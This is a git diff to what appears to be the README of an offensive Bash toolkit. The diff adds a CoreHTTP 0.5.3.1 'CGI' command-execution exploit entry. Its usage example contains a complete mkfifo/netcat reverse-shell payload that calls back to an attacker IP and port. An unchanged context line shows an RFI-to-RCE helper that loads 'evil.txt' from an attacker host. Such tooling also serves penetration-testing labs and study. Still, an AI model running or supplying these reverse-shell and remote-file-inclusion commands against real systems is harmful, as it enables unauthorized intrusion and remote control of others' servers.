@@ -21,6 +21,13 @@ for f in $files; do cp "$f" /usr/local/bin/"${f%.sh}"; done
 ```
 ![CVE-2006-3392](https://raw.githubusercontent.com/tobor88/Bash/master/cve20063392.png)
 
+- __CoreHTTP 0.5.3.1 - 'CGI' Arbitrary Command Execution__ This exploit is used to obtain a reverse shell from a remote server hosting a CoreHTTP instance version 0.5.3.1 or lower. CoreHTTP server fails to properly sanitize input before calling the popen() function in http.c. Define a reverse shell to execute. I have a common list on my site [Reverse Shells Here](https://roberthosborne.com/reverse-shells)
+```bash
+# Example Usage:
+./corehttp-rev-shell.sh -u 'http://10.11.1.2:10443/foo.pl' -s 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.172 1338 >/tmp/f'
+```
+![corehttp-reverse-shell](https://raw.githubusercontent.com/tobor88/Bash/master/corehttp-rev-shell.png)
+
 - __rfi-rce.sh__ This is a command that can be used to simplify RCE through a remote file inclusion vulnerability by exploiting it in a shell like fashion.
 ```bash
 rfi-rce -f /var/www/html/evil.txt -u "http://target-ip/section.php?page=http://attacker-ip/evil.txt"
